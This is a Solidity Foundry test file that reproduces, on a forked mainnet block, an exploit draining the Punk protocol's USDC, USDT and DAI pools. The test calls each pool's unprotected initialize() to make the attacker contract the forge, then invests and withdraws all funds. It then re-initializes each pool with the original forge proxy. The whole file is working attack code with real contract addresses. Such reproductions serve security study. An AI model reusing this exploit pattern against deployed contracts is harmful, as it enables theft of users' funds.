// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

interface IPunk {
    function initialize(
        address forge_,
        address token_,
        address cToken_,
        address comp_,
        address comptroller_,
        address uRouterV2_
    ) external;
    function invest() external;
    function underlyingBalanceWithInvestment() external returns (uint256);
    function withdrawToForge(uint256 amount) external;
}

contract Exploit_Punk is TestHarness, TokenBalanceTracker {
    IPunk internal punkUsdc = IPunk(0x3BC6aA2D25313ad794b2D67f83f21D341cc3f5fb);
    IPunk internal punkUsdt = IPunk(0x1F3b04c8c96A31C7920372FFa95371C80A4bfb0D);
    IPunk internal punkDai = IPunk(0x929cb86046E421abF7e1e02dE7836742654D49d6);

    address[] internal punks = [address(punkUsdc), address(punkUsdt), address(punkDai)];

    IERC20 internal usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 internal usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 internal dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    address[] internal tokens = [address(usdc), address(usdt), address(dai)];

    address[] internal cTokens = [
        0x39AA39c021dfbaE8faC545936693aC917d5E7563, // cUSDC
        0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9, // cUSDT
        0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643 // cDAI
    ];

    address[] internal forgeProxies = [
        0x0a548513693a09135604E78b8a8fE3bB801586E6, // USDC
        0x0d73Ad702AC09EDDAcc10cEB137cbf84e6B3b9e0, // USDT
        0xc9309a6121cE122c3FB3F7AA8920fb4CBd5fBEEC // DAI
    ];

    // address internal attackerEOA = address(0x69);

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 12995894);

        cheat.deal(address(this), 0);

        addTokensToTracker(tokens);

        updateBalanceTracker(address(this));
        // updateBalanceTracker(attackerEOA);
        updateBalanceTracker(address(punkUsdc));
        updateBalanceTracker(address(punkUsdt));
        updateBalanceTracker(address(punkDai));
    }

    function test_attack() external {
        uint256 punksLen = punks.length;

        uint256[3] memory balancesBefore;
        for (uint8 i = 0; i < tokens.length; i++) {
            balancesBefore[i] = IERC20(tokens[i]).balanceOf(address(this));
        }

        for (uint256 i = 0; i < punksLen; i++) {
            console.log("===== Draining %s pool =====", IERC20(tokens[i]).name());
            attackAPunk(punks[i], tokens[i], cTokens[i], forgeProxies[i]);
        }

        for (uint8 i = 0; i < tokens.length; i++) {
            assertGe(IERC20(tokens[i]).balanceOf(address(this)), balancesBefore[i]);
        }
    }

    function attackAPunk(address _punk, address _token, address _cToken, address _forgeProxy) internal {
        IPunk punk = IPunk(_punk);

        punk.initialize(
            address(this),
            _token,
            _cToken,
            0xc00e94Cb662C3520282E6f5717214004A7f26888, // COMP token
            0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B, // Comptroller
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D // Uniswap V2 Router
        );
        console.log("Before withdrawing");
        logBalancesWithLabel("Attacker contract", address(this));

        punk.invest();

        punk.withdrawToForge(punk.underlyingBalanceWithInvestment());

        console.log("After withdrawing");
        logBalancesWithLabel("Attacker contract", address(this));
        punk.initialize(
            _forgeProxy,
            _token,
            _cToken,
            0xc00e94Cb662C3520282E6f5717214004A7f26888, // COMP token
            0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B, // Comptroller
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D // Uniswap V2 Router
        );
    }
}
